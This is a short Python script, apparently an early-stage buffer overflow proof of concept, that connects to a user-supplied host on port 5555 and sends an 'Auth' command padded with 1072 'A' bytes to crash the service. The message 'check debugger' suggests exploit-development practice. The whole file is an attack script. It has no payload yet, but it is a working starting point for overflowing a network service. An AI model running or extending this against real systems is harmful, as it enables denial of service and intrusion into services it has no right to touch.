#!/usr/bin/python

import time
import struct
import sys
import socket as so


try:
    server = sys.argv[1]
    port = 5555

except IndexError:
    print("[+] Usage %s host" % sys.argv[0])
    sys.exit(1)

req1 = "Auth " + "\x41" * 1072

s = so.socket(so.AF_INET, so.SOCK_STREAM)

try:
    s.connect((server, port))
    print(repr(s.recv(1024)))
    s.send(req1)
    print(repr(s.recv(1024)))
except Exception:
    print("[!] connection refused, check debugger")

s.close()
